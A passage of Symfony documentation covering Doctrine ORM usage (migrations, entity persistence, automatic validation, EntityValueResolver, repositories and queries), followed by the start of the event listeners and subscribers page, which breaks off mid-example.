    Next: Review the new migration "migrations/Version20211116204726.php"
    Then: Run the migration with php bin/console doctrine:migrations:migrate

If you open this file, it contains the SQL needed to update your database! To run
that SQL, execute your migrations:

.. code-block:: terminal

    $ php bin/console doctrine:migrations:migrate

This command executes all migration files that have not already been run against
your database. You should run this command on production when you deploy to keep
your production database up-to-date.

.. _doctrine-add-more-fields:

Migrations & Adding more Fields
-------------------------------

But what if you need to add a new field property to ``Product``, like a
``description``? You can edit the class to add the new property. But, you can
also use ``make:entity`` again:

.. code-block:: bash

    $ php bin/console make:entity

    Class name of the entity to create or update
    > Product

    New property name (press <return> to stop adding fields):
    > description

    Field type (enter ? to see all types) [string]:
    > text

    Can this field be null in the database (nullable) (yes/no) [no]:
    > no

    New property name (press <return> to stop adding fields):
    >
    (press enter again to finish)

This adds the new ``description`` property and ``getDescription()`` and ``setDescription()``
methods:

.. code-block:: diff

      // src/Entity/Product.php
      // ...
    +  use Doctrine\DBAL\Types\Types;

      class Product
      {
          // ...

    +     #[ORM\Column(type: Types::TEXT)]
    +     private string $description;

          // getDescription() & setDescription() were also added
      }

The new property is mapped, but it doesn't exist yet in the ``product`` table. No
problem! Generate a new migration:

.. code-block:: terminal

    $ php bin/console make:migration

This time, the SQL in the generated file will look like this:

.. code-block:: sql

    ALTER TABLE product ADD description LONGTEXT NOT NULL

The migration system is *smart*. It compares all of your entities with the current
state of the database and generates the SQL needed to synchronize them! Like
before, execute your migrations:

.. code-block:: terminal

    $ php bin/console doctrine:migrations:migrate

This will only execute the *one* new migration file, because DoctrineMigrationsBundle
knows that the first migration was already executed earlier. Behind the scenes, it
manages a ``migration_versions`` table to track this.

Each time you make a change to your schema, run these two commands to generate the
migration and then execute it. Be sure to commit the migration files and execute
them when you deploy.

.. _doctrine-generating-getters-and-setters:

.. tip::

    If you prefer to add new properties manually, the ``make:entity`` command can
    generate the getter & setter methods for you:

    .. code-block:: terminal

        $ php bin/console make:entity --regenerate

    If you make some changes and want to regenerate *all* getter/setter methods,
    also pass ``--overwrite``.

Persisting Objects to the Database
----------------------------------

It's time to save a ``Product`` object to the database! Let's create a new controller
to experiment:

.. code-block:: terminal

    $ php bin/console make:controller ProductController

Inside the controller, you can create a new ``Product`` object, set data on it,
and save it::

    // src/Controller/ProductController.php
    namespace App\Controller;

    // ...
    use App\Entity\Product;
    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;

    class ProductController extends AbstractController
    {
        #[Route('/product', name: 'create_product')]
        public function createProduct(EntityManagerInterface $entityManager): Response
        {
            $product = new Product();
            $product->setName('Keyboard');
            $product->setPrice(1999);
            $product->setDescription('Ergonomic and stylish!');

            // tell Doctrine you want to (eventually) save the Product (no queries yet)
            $entityManager->persist($product);

            // actually executes the queries (i.e. the INSERT query)
            $entityManager->flush();

            return new Response('Saved new product with id '.$product->getId());
        }
    }

Try it out!

    http://localhost:8000/product

Congratulations! You just created your first row in the ``product`` table. To prove it,
you can query the database directly:

.. code-block:: terminal

    $ php bin/console dbal:run-sql 'SELECT * FROM product'

    # on Windows systems not using Powershell, run this command instead:
    # php bin/console dbal:run-sql "SELECT * FROM product"

Take a look at the previous example in more detail:

.. _doctrine-entity-manager:

* **line 13** The ``EntityManagerInterface $entityManager`` argument tells Symfony
  to :ref:`inject the Entity Manager service <services-constructor-injection>` into
  the controller method. This object is responsible for saving objects to, and
  fetching objects from, the database.

* **lines 15-18** In this section, you instantiate and work with the ``$product``
  object like any other normal PHP object.

* **line 21** The ``persist($product)`` call tells Doctrine to "manage" the
  ``$product`` object. This does **not** cause a query to be made to the database.

* **line 24** When the ``flush()`` method is called, Doctrine looks through
  all of the objects that it's managing to see if they need to be persisted
  to the database. In this example, the ``$product`` object's data doesn't
  exist in the database, so the entity manager executes an ``INSERT`` query,
  creating a new row in the ``product`` table.

.. note::

    If the ``flush()`` call fails, a ``Doctrine\ORM\ORMException`` exception
    is thrown. See `Transactions and Concurrency`_.

Whether you're creating or updating objects, the workflow is always the same: Doctrine
is smart enough to know if it should INSERT or UPDATE your entity.

.. _automatic_object_validation:

Validating Objects
------------------

:doc:`The Symfony validator </validation>` can reuse Doctrine metadata to perform
some basic validation tasks. First, add or configure the
:ref:`auto_mapping option <reference-validation-auto-mapping>` to define which
entities should be introspected by Symfony to add automatic validation constraints.

Consider the following controller code::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    use Symfony\Component\Validator\Validator\ValidatorInterface;
    // ...

    class ProductController extends AbstractController
    {
        #[Route('/product', name: 'create_product')]
        public function createProduct(ValidatorInterface $validator): Response
        {
            $product = new Product();

            // ... update the product data somehow (e.g. with a form) ...

            $errors = $validator->validate($product);
            if (count($errors) > 0) {
                return new Response((string) $errors, 400);
            }

            // ...
        }
    }

Although the ``Product`` entity doesn't define any explicit
:doc:`validation configuration </validation>`, if the ``auto_mapping`` option
includes it in the list of entities to introspect, Symfony will infer some
validation rules for it and will apply them.

For example, given that the ``name`` property can't be ``null`` in the database, a
:doc:`NotNull constraint </reference/constraints/NotNull>` is added automatically
to the property (if it doesn't contain that constraint already).

The following table summarizes the mapping between Doctrine metadata and
the corresponding validation constraints added automatically by Symfony:

==================  =========================================================  =====
Doctrine attribute  Validation constraint                                      Notes
==================  =========================================================  =====
``nullable=false``  :doc:`NotNull </reference/constraints/NotNull>`            Requires installing the :doc:`PropertyInfo component </components/property_info>`
``type``            :doc:`Type </reference/constraints/Type>`                  Requires installing the :doc:`PropertyInfo component </components/property_info>`
``unique=true``     :doc:`UniqueEntity </reference/constraints/UniqueEntity>`
``length``          :doc:`Length </reference/constraints/Length>`
==================  =========================================================  =====

Because :doc:`the Form component </forms>` as well as `API Platform`_ internally
use the Validator component, all your forms and web APIs will also automatically
benefit from these automatic validation constraints.

This automatic validation is a nice feature to improve your productivity, but it
doesn't replace the validation configuration entirely. You still need to add
some :doc:`validation constraints </reference/constraints>` to ensure that data
provided by the user is correct.

Fetching Objects from the Database
----------------------------------

Fetching an object back out of the database is even easier. Suppose you want to
be able to go to ``/product/1`` to see your new product::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    // ...

    class ProductController extends AbstractController
    {
        #[Route('/product/{id}', name: 'product_show')]
        public function show(EntityManagerInterface $entityManager, int $id): Response
        {
            $product = $entityManager->getRepository(Product::class)->find($id);

            if (!$product) {
                throw $this->createNotFoundException(
                    'No product found for id '.$id
                );
            }

            return new Response('Check out this great product: '.$product->getName());

            // or render a template
            // in the template, print things with {{ product.name }}
            // return $this->render('product/show.html.twig', ['product' => $product]);
        }
    }

Another possibility is to use the ``ProductRepository`` using Symfony's autowiring
and injected by the dependency injection container::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    use App\Repository\ProductRepository;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    // ...

    class ProductController extends AbstractController
    {
        #[Route('/product/{id}', name: 'product_show')]
        public function show(ProductRepository $productRepository, int $id): Response
        {
            $product = $productRepository
                ->find($id);

            // ...
        }
    }

Try it out!

    http://localhost:8000/product/1

When you query for a particular type of object, you always use what's known
as its "repository". You can think of a repository as a PHP class whose only
job is to help you fetch entities of a certain class.

Once you have a repository object, you have many helper methods::

    $repository = $entityManager->getRepository(Product::class);

    // look for a single Product by its primary key (usually "id")
    $product = $repository->find($id);

    // look for a single Product by name
    $product = $repository->findOneBy(['name' => 'Keyboard']);
    // or find by name and price
    $product = $repository->findOneBy([
        'name' => 'Keyboard',
        'price' => 1999,
    ]);

    // look for multiple Product objects matching the name, ordered by price
    $products = $repository->findBy(
        ['name' => 'Keyboard'],
        ['price' => 'ASC']
    );

    // look for *all* Product objects
    $products = $repository->findAll();

You can also add *custom* methods for more complex queries! More on that later in
the :ref:`doctrine-queries` section.

.. tip::

    When rendering an HTML page, the web debug toolbar at the bottom of the page
    will display the number of queries and the time it took to execute them:

    .. image:: /_images/doctrine/doctrine_web_debug_toolbar.png
        :alt: The web dev toolbar showing the Doctrine item.
        :class: with-browser

    If the number of database queries is too high, the icon will turn yellow to
    indicate that something may not be correct. Click on the icon to open the
    Symfony Profiler and see the exact queries that were executed. If you don't
    see the web debug toolbar, install the ``profiler`` :ref:`Symfony pack <symfony-packs>`
    by running this command: ``composer require --dev symfony/profiler-pack``.

    For more information, read the :doc:`Symfony profiler documentation </profiler>`.

.. _doctrine-entity-value-resolver:

Automatically Fetching Objects (EntityValueResolver)
----------------------------------------------------

.. versionadded:: 2.7.1

    Autowiring of the ``EntityValueResolver`` was introduced in DoctrineBundle 2.7.1.

In many cases, you can use the ``EntityValueResolver`` to do the query for you
automatically! You can simplify the controller to::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    use App\Repository\ProductRepository;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    // ...

    class ProductController extends AbstractController
    {
        #[Route('/product/{id}')]
        public function show(Product $product): Response
        {
            // use the Product!
            // ...
        }
    }

That's it! The bundle uses the ``{id}`` from the route to query for the ``Product``
by the ``id`` column. If it's not found, a 404 page is generated.

.. tip::

    When enabled globally, it's possible to disable the behavior on a specific
    controller, by using the ``MapEntity`` set to ``disabled``::

        public function show(
            #[CurrentUser]
            #[MapEntity(disabled: true)]
            User $user
        ): Response {
            // User is not resolved by the EntityValueResolver
            // ...
        }

Fetch Automatically
~~~~~~~~~~~~~~~~~~~

If your route wildcards match properties on your entity, then the resolver
will automatically fetch them::

    /**
     * Fetch via primary key because {id} is in the route.
     */
    #[Route('/product/{id}')]
    public function showByPk(Product $product): Response
    {
    }

    /**
     * Perform a findOneBy() where the slug property matches {slug}.
     */
    #[Route('/product/{slug}')]
    public function showBySlug(Product $product): Response
    {
    }

Automatic fetching works in these situations:

* If ``{id}`` is in your route, then this is used to fetch by
  primary key via the ``find()`` method.

* The resolver will attempt to do a ``findOneBy()`` fetch by using
  *all* of the wildcards in your route that are actually properties
  on your entity (non-properties are ignored).

This behavior is enabled by default on all controllers. If you prefer, you can
restrict this feature to only work on route wildcards called ``id`` to look for
entities by primary key. To do so, set the option
``doctrine.orm.controller_resolver.auto_mapping`` to ``false``.

When ``auto_mapping`` is disabled, you can configure the mapping explicitly for
any controller argument with the ``MapEntity`` attribute. You can even control
the ``EntityValueResolver`` behavior by using the `MapEntity options`_ ::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    use Symfony\Bridge\Doctrine\Attribute\MapEntity;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    // ...

    class ProductController extends AbstractController
    {
        #[Route('/product/{slug}')]
        public function show(
            #[MapEntity(mapping: ['slug' => 'slug'])]
            Product $product
        ): Response {
            // use the Product!
            // ...
        }
    }

Fetch via an Expression
~~~~~~~~~~~~~~~~~~~~~~~

If automatic fetching doesn't work for your use case, you can write an expression
using the :doc:`ExpressionLanguage component </components/expression_language>`::

    #[Route('/product/{product_id}')]
    public function show(
        #[MapEntity(expr: 'repository.find(product_id)')]
        Product $product
    ): Response {
    }

In the expression, the ``repository`` variable will be your entity's
Repository class and any route wildcards - like ``{product_id}`` are
available as variables.

This can also be used to help resolve multiple arguments::

    #[Route('/product/{id}/comments/{comment_id}')]
    public function show(
        Product $product,
        #[MapEntity(expr: 'repository.find(comment_id)')]
        Comment $comment
    ): Response {
    }

In the example above, the ``$product`` argument is handled automatically,
but ``$comment`` is configured with the attribute since they cannot both follow
the default convention.

If you need to get other information from the request to query the database, you
can also access the request in your expression thanks to the ``request``
variable. Let's say you want the first or the last comment of a product depending on a query parameter named ``sort``::

    #[Route('/product/{id}/comments')]
    public function show(
        Product $product,
        #[MapEntity(expr: 'repository.findOneBy({"product": id}, {"createdAt": request.query.get("sort", "DESC")})')]
        Comment $comment
    ): Response {
    }

MapEntity Options
~~~~~~~~~~~~~~~~~

A number of options are available on the ``MapEntity`` attribute to
control behavior:

``id``
    If an ``id`` option is configured and matches a route parameter, then
    the resolver will find by the primary key::

        #[Route('/product/{product_id}')]
        public function show(
            #[MapEntity(id: 'product_id')]
            Product $product
        ): Response {
        }

``mapping``
    Configures the properties and values to use with the ``findOneBy()``
    method: the key is the route placeholder name and the value is the Doctrine
    property name::

        #[Route('/product/{category}/{slug}/comments/{comment_slug}')]
        public function show(
            #[MapEntity(mapping: ['category' => 'category', 'slug' => 'slug'])]
            Product $product,
            #[MapEntity(mapping: ['comment_slug' => 'slug'])]
            Comment $comment
        ): Response {
        }

``exclude``
    Configures the properties that should be used in the ``findOneBy()``
    method by *excluding* one or more properties so that not *all* are used::

        #[Route('/product/{slug}/{date}')]
        public function show(
            #[MapEntity(exclude: ['date'])]
            Product $product,
            \DateTime $date
        ): Response {
        }

``stripNull``
    If true, then when ``findOneBy()`` is used, any values that are
    ``null`` will not be used for the query.

``objectManager``
    By default, the ``EntityValueResolver`` uses the *default*
    object manager, but you can configure this::

        #[Route('/product/{id}')]
        public function show(
            #[MapEntity(objectManager: 'foo')]
            Product $product
        ): Response {
        }

``evictCache``
    If true, forces Doctrine to always fetch the entity from the database
    instead of cache.

``disabled``
    If true, the ``EntityValueResolver`` will not try to replace the argument.

``message``
    An optional custom message displayed when there's a :class:`Symfony\\Component\\HttpKernel\\Exception\\NotFoundHttpException`,
    but **only in the development environment** (you won't see this message in production)::

        #[Route('/product/{product_id}')]
        public function show(
            #[MapEntity(id: 'product_id', message: 'The product does not exist')]
            Product $product
        ): Response {
        }

.. versionadded:: 7.1

    The ``message`` option was introduced in Symfony 7.1.

Updating an Object
------------------

Once you've fetched an object from Doctrine, you interact with it the same as
with any PHP model::

    // src/Controller/ProductController.php
    namespace App\Controller;

    use App\Entity\Product;
    use App\Repository\ProductRepository;
    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\Routing\Attribute\Route;
    // ...

    class ProductController extends AbstractController
    {
        #[Route('/product/edit/{id}', name: 'product_edit')]
        public function update(EntityManagerInterface $entityManager, int $id): Response
        {
            $product = $entityManager->getRepository(Product::class)->find($id);

            if (!$product) {
                throw $this->createNotFoundException(
                    'No product found for id '.$id
                );
            }

            $product->setName('New product name!');
            $entityManager->flush();

            return $this->redirectToRoute('product_show', [
                'id' => $product->getId()
            ]);
        }
    }

Using Doctrine to edit an existing product consists of three steps:

#. fetching the object from Doctrine;
#. modifying the object;
#. calling ``flush()`` on the entity manager.

You *can* call ``$entityManager->persist($product)``, but it isn't necessary:
Doctrine is already "watching" your object for changes.

Deleting an Object
------------------

Deleting an object is very similar, but requires a call to the ``remove()``
method of the entity manager::

    $entityManager->remove($product);
    $entityManager->flush();

As you might expect, the ``remove()`` method notifies Doctrine that you'd
like to remove the given object from the database. The ``DELETE`` query isn't
actually executed until the ``flush()`` method is called.

.. _doctrine-queries:

Querying for Objects: The Repository
------------------------------------

You've already seen how the repository object allows you to run basic queries
without any work::

    // from inside a controller
    $repository = $entityManager->getRepository(Product::class);
    $product = $repository->find($id);

But what if you need a more complex query? When you generated your entity with
``make:entity``, the command *also* generated a ``ProductRepository`` class::

    // src/Repository/ProductRepository.php
    namespace App\Repository;

    use App\Entity\Product;
    use Doctrine\Bundle\DoctrineBundle\Repository\ServiceEntityRepository;
    use Doctrine\Persistence\ManagerRegistry;

    class ProductRepository extends ServiceEntityRepository
    {
        public function __construct(ManagerRegistry $registry)
        {
            parent::__construct($registry, Product::class);
        }
    }

When you fetch your repository (i.e. ``->getRepository(Product::class)``), it is
*actually* an instance of *this* object! This is because of the ``repositoryClass``
config that was generated at the top of your ``Product`` entity class.

Suppose you want to query for all Product objects greater than a certain price. Add
a new method for this to your repository::

    // src/Repository/ProductRepository.php

    // ...
    class ProductRepository extends ServiceEntityRepository
    {
        public function __construct(ManagerRegistry $registry)
        {
            parent::__construct($registry, Product::class);
        }

        /**
         * @return Product[]
         */
        public function findAllGreaterThanPrice(int $price): array
        {
            $entityManager = $this->getEntityManager();

            $query = $entityManager->createQuery(
                'SELECT p
                FROM App\Entity\Product p
                WHERE p.price > :price
                ORDER BY p.price ASC'
            )->setParameter('price', $price);

            // returns an array of Product objects
            return $query->getResult();
        }
    }

The string passed to ``createQuery()`` might look like SQL, but it is
`Doctrine Query Language`_. This allows you to type queries using commonly
known query language, but referencing PHP objects instead (i.e. in the ``FROM``
statement).

Now, you can call this method on the repository::

    // from inside a controller
    $minPrice = 1000;

    $products = $entityManager->getRepository(Product::class)->findAllGreaterThanPrice($minPrice);

    // ...

See :ref:`services-constructor-injection` for how to inject the repository into
any service.

Querying with the Query Builder
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Doctrine also provides a `Query Builder`_, an object-oriented way to write
queries. It is recommended to use this when queries are built dynamically (i.e.
based on PHP conditions)::

    // src/Repository/ProductRepository.php

    // ...
    class ProductRepository extends ServiceEntityRepository
    {
        public function findAllGreaterThanPrice(int $price, bool $includeUnavailableProducts = false): array
        {
            // automatically knows to select Products
            // the "p" is an alias you'll use in the rest of the query
            $qb = $this->createQueryBuilder('p')
                ->where('p.price > :price')
                ->setParameter('price', $price)
                ->orderBy('p.price', 'ASC');

            if (!$includeUnavailableProducts) {
                $qb->andWhere('p.available = TRUE');
            }

            $query = $qb->getQuery();

            return $query->execute();

            // to get just one result:
            // $product = $query->setMaxResults(1)->getOneOrNullResult();
        }
    }

Querying with SQL
~~~~~~~~~~~~~~~~~

In addition, you can query directly with SQL if you need to::

    // src/Repository/ProductRepository.php

    // ...
    class ProductRepository extends ServiceEntityRepository
    {
        public function findAllGreaterThanPrice(int $price): array
        {
            $conn = $this->getEntityManager()->getConnection();

            $sql = '
                SELECT * FROM product p
                WHERE p.price > :price
                ORDER BY p.price ASC
                ';

            $resultSet = $conn->executeQuery($sql, ['price' => $price]);

            // returns an array of arrays (i.e. a raw data set)
            return $resultSet->fetchAllAssociative();
        }
    }

With SQL, you will get back raw data, not objects (unless you use the `NativeQuery`_
functionality).

Configuration
-------------

See the :doc:`Doctrine config reference </reference/configuration/doctrine>`.

Relationships and Associations
------------------------------

Doctrine provides all the functionality you need to manage database relationships
(also known as associations), including ManyToOne, OneToMany, OneToOne and ManyToMany
relationships.

For info, see :doc:`/doctrine/associations`.

Database Testing
----------------

Read the article about :doc:`testing code that interacts with the database </testing/database>`.

Doctrine Extensions (Timestampable, Translatable, etc.)
-------------------------------------------------------

Doctrine community has created some extensions to implement common needs such as
*"set the value of the createdAt property automatically when creating an entity"*.
Read more about the `available Doctrine extensions`_ and use the
`StofDoctrineExtensionsBundle`_ to integrate them in your application.

Learn more
----------

.. toctree::
    :maxdepth: 1

    doctrine/associations
    doctrine/events
    doctrine/registration_form
    doctrine/custom_dql_functions
    doctrine/dbal
    doctrine/multiple_entity_managers
    doctrine/resolve_target_entity
    doctrine/reverse_engineering
    testing/database

.. _`Doctrine`: https://www.doctrine-project.org/
.. _`RFC 3986`: https://www.ietf.org/rfc/rfc3986.txt
.. _`list of Doctrine mapping types`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/basic-mapping.html#reference-mapping-types
.. _`Query Builder`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/query-builder.html
.. _`Doctrine Query Language`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/dql-doctrine-query-language.html
.. _`Reserved SQL keywords documentation`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/basic-mapping.html#quoting-reserved-words
.. _`DoctrineMongoDBBundle docs`: https://symfony.com/doc/current/bundles/DoctrineMongoDBBundle/index.html
.. _`Transactions and Concurrency`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/transactions-and-concurrency.html
.. _`DoctrineMigrationsBundle`: https://github.com/doctrine/DoctrineMigrationsBundle
.. _`NativeQuery`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/native-sql.html
.. _`limit of 767 bytes for the index key prefix`: https://dev.mysql.com/doc/refman/5.6/en/innodb-limits.html
.. _`Doctrine screencast series`: https://symfonycasts.com/screencast/symfony-doctrine
.. _`API Platform`: https://api-platform.com/docs/core/validation/
.. _`PDO`: https://www.php.net/pdo
.. _`available Doctrine extensions`: https://github.com/doctrine-extensions/DoctrineExtensions
.. _`StofDoctrineExtensionsBundle`: https://github.com/stof/StofDoctrineExtensionsBundle
.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
Events and Event Listeners
==========================

During the execution of a Symfony application, lots of event notifications are
triggered. Your application can listen to these notifications and respond to
them by executing any piece of code.

Symfony triggers several :doc:`events related to the kernel </reference/events>`
while processing the HTTP Request. Third-party bundles may also dispatch events, and
you can even dispatch :doc:`custom events </components/event_dispatcher>` from your
own code.

All the examples shown in this article use the same ``KernelEvents::EXCEPTION``
event for consistency purposes. In your own application, you can use any event
and even mix several of them in the same subscriber.

Creating an Event Listener
--------------------------

The most common way to listen to an event is to register an **event listener**::

    // src/EventListener/ExceptionListener.php
    namespace App\EventListener;

    use Symfony\Component\HttpFoundation\Response;
    use Symfony\Component\HttpKernel\Event\ExceptionEvent;
    use Symfony\Component\HttpKernel\Exception\HttpExceptionInterface;

    class ExceptionListener
    {
        public function __invoke(ExceptionEvent $event): void
        {
            // You get the exception object from the received event
            $exception = $event->getThrowable();
            $message = sprintf(
                'My Error says: %s with code: %s',
                $exception->getMessage(),
                $exception->getCode()
            );

            // Customize your response object to display the exception details
            $response = new Response();
            $response->setContent($message);

            // HttpExceptionInterface is a special type of exception that
            // holds status code and header details
            if ($exception instanceof HttpExceptionInterface) {
                $response->setStatusCode($exception->getStatusCode());
                $response->headers->replace($exception->getHeaders());
            } else {
                $response->setStatusCode(Response::HTTP_INTERNAL_SERVER_ERROR);
            }

            // sends the modified response object to the event
            $event->setResponse($response);
        }
    }

Now that the class is created, you need to register it as a service and
notify Symfony that it is an event listener by using a special "tag":

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            App\EventListener\ExceptionListener:
                tags: [kernel.event_listener]

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <service id="App\EventListener\ExceptionListener">
                    <tag name="kernel.event_listener"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\EventListener\ExceptionListener;

        return function(ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(ExceptionListener::class)
                ->tag('kernel.event_listener')
            ;
        };

Symfony follows this logic to decide which method to call inside the event
listener class:

#. If the ``kernel.event_listener`` tag defines the ``method`` attribute, that's
   the name of the method to be called;
#. If no ``method`` attribute is defined, try to call the ``__invoke()`` magic
   method (which makes event listeners invokable);
#. If the ``__invoke()`` method is not defined either, throw an exception.

.. note::

    There is an optional attribute for the ``kernel.event_listener`` tag called
    ``priority``, which is a positive or negative integer that defaults to ``0``
    and it controls the order in which listeners are executed (the higher the
    number, the earlier a listener is executed). This is useful when you need to
    guarantee that one listener is executed before another. The priorities of the
    internal Symfony listeners usually range from ``-256`` to ``256`` but your
    own listeners can use any positive or negative integer.

.. note::

    There is an optional attribute for the ``kernel.event_listener`` tag called
    ``event`` which is useful when listener ``$event`` argument is not typed.
    If you configure it, it will change type of ``$event`` object.
    For the ``kernel.exception`` event, it is :class:`Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent`.
    Check out the :doc:`Symfony events reference </reference/events>` to see
    what type of object each event provides.

    With this attribute, Symfony follows this logic to decide which method to call
    inside the event listener class:

    #. If the ``kernel.event_listener`` tag defines the ``method`` attribute, that's
       the name of the method to be called;
    #. If no ``method`` attribute is defined, try to call the method whose name
       is ``on`` + "PascalCased event name" (e.g. ``onKernelException()`` method for
       the ``kernel.exception`` event);
    #. If that method is not defined either, try to call the ``__invoke()`` magic
       method (which makes event listeners invokable);
    #. If the ``__invoke()`` method is not defined either, throw an exception.

.. _event-dispatcher_event-listener-attributes:

Defining Event Listeners with PHP Attributes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

An alternative way to define an event listener is to use the
:class:`Symfony\\Component\\EventDispatcher\\Attribute\\AsEventListener`
PHP attribute. This allows to configure the listener inside its class, without
having to add any configuration in external files::

    namespace App\EventListener;

    use Symfony\Component\EventDispatcher\Attribute\AsEventListener;

    #[AsEventListener]
    final class MyListener
    {
        public function __invoke(CustomEvent $event): void
        {
            // ...
        }
    }

You can add multiple ``#[AsEventListener()]`` attributes to configure different methods::

    namespace App\EventListener;

    use Symfony\Component\EventDispatcher\Attribute\AsEventListener;

    #[AsEventListener(event: CustomEvent::class, method: 'onCustomEvent')]
    #[AsEventListener(event: 'foo', priority: 42)]
    #[AsEventListener(event: 'bar', method: 'onBarEvent')]
    final class MyMultiListener
    {
        public function onCustomEvent(CustomEvent $event): void
        {
            // ...
        }

        public function onFoo(): void
        {
            // ...
        }

        public function onBarEvent(): void
        {
            // ...
        }
    }

:class:`Symfony\\Component\\EventDispatcher\\Attribute\\AsEventListener`
can also be applied to methods directly::

    namespace App\EventListener;

    use Symfony\Component\EventDispatcher\Attribute\AsEventListener;

    final class MyMultiListener
    {
        #[AsEventListener()]
        public function onCustomEvent(CustomEvent $event): void
        {
            // ...
        }

        #[AsEventListener(event: 'foo', priority: 42)]
        public function onFoo(): void
        {
            // ...
        }

        #[AsEventListener(event: 'bar')]
        public function onBarEvent(): void
        {
            // ...
        }
    }

.. note::

    Note that the attribute doesn't require its ``event`` parameter to be set
    if the method already type-hints the expected event.

.. _events-subscriber:

Creating an Event Subscriber
----------------------------

Another way to listen to events is via an **event subscriber**, which is a class
that defines one or more methods that listen to one or various events. The main
difference with the event listeners is that subscribers always know the events
to which they are listening.

If different event subscriber methods listen to the same event, their order is
defined by the ``priority`` parameter. This value is a positive or negative
integer which defaults to ``0``. The higher the number, the earlier the method
is called. **Priority is aggregated for all listeners and subscribers**, so your
methods could be called before or after the methods defined in other listeners
and subscribers. To learn more about event subscribers, read :doc:`/components/event_dispatcher`.

The following example shows an event subscriber that defines several methods which
listen to the same ``kernel.exception`` event::

    // src/EventSubscriber/ExceptionSubscriber.php
    namespace App\EventSubscriber;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpKernel\Event\ExceptionEvent;
    use Symfony\Component\HttpKernel\KernelEvents;

    class ExceptionSubscriber implements EventSubscriberInterface
    {
        public static function getSubscribedEvents(): array
        {
            // return the subscribed events, their methods and priorities
            return [
                KernelEvents::EXCEPTION => [
                    ['processException', 10],
                    ['logException', 0],
                    ['notifyException', -10],
                ],
            ];
        }

        public function processException(ExceptionEvent $event): void
        {
            // ...
        }

        public function logException(ExceptionEvent $event): void
        {
            // ...
        }

        public function notifyException(ExceptionEvent $event): void
        {
            // ...
        }
    }

That's it! Your ``services.yaml`` file should already be setup to load services from
the ``EventSubscriber`` directory. Symfony takes care of the rest.

.. _ref-event-subscriber-configuration:

.. tip::

    If your methods are *not* called when an exception is thrown, double-check that
    you're :ref:`loading services <service-container-services-load-example>` from
    the ``EventSubscriber`` directory and have :ref:`autoconfigure <services-autoconfigure>`
    enabled. You can also manually add the ``kernel.event_subscriber`` tag.

Request Events, Checking Types
------------------------------

A single page can make several requests (one main request, and then multiple
sub-requests - typically when :ref:`embedding controllers in templates <templates-embed-controllers>`).
For the core Symfony events, you might need to check to see if the event is for
a "main" request or a "sub request"::

    // src/EventListener/RequestListener.php
    namespace App\EventListener;

    use Symfony\Component\HttpKernel\Event\RequestEvent;

    class RequestListener
    {
        public function onKernelRequest(RequestEvent $event): void
        {
            if (!$event->isMainRequest()) {
                // don't do anything if it's not the main request
                return;
            }

            // ...
        }
    }

Certain things, like checking information on the *real* request, may not need to
be done on the sub-request listeners.

.. _events-or-subscribers:

Listeners or Subscribers
------------------------

Listeners and subscribers can be used in the same application indistinctly. The
decision to use either of them is usually a matter of personal taste. However,
there are some minor advantages for each of them:

* **Subscribers are easier to reuse** because the knowledge of the events is kept
  in the class rather than in the service definition. This is the reason why
  Symfony uses subscribers internally;
* **Listeners are more flexible** because bundles can enable or disable each of
  them conditionally depending on some configuration value.

Event Aliases
-------------

When configuring event listeners and subscribers via dependency injection,
Symfony's core events can also be referred to by the fully qualified class
name (FQCN) of the corresponding event class::

    // src/EventSubscriber/RequestSubscriber.php
    namespace App\EventSubscriber;

    use Symfony\Component\EventDispatcher\EventSubscriberInterface;
    use Symfony\Component\HttpKernel\Event\RequestEvent;

    class RequestSubscriber implements EventSubscriberInterface
    {
        public static function getSubscribedEvents(): array
        {
            return [
                RequestEvent::class => 'onKernelRequest',
            ];
        }

        public function onKernelRequest(RequestEvent $event): void
        {
            // ...
        }
    }

Internally, the event FQCN are treated as aliases for the original event names.
Since the mapping already happens when compiling the service container, event
listeners and subscribers using FQCN instead of event names will appear under
the original event name when inspecting the event dispatcher.

This alias mapping can be extended for custom events by registering the
compiler pass ``AddEventAliasesPass``::

    // src/Kernel.php
    namespace App;

    use App\Event\MyCustomEvent;
    use Symfony\Component\DependencyInjection\ContainerBuilder;
    use Symfony\Component\EventDispatcher\DependencyInjection\AddEventAliasesPass;
    use Symfony\Component\HttpKernel\Kernel as BaseKernel;

    class Kernel extends BaseKernel
    {
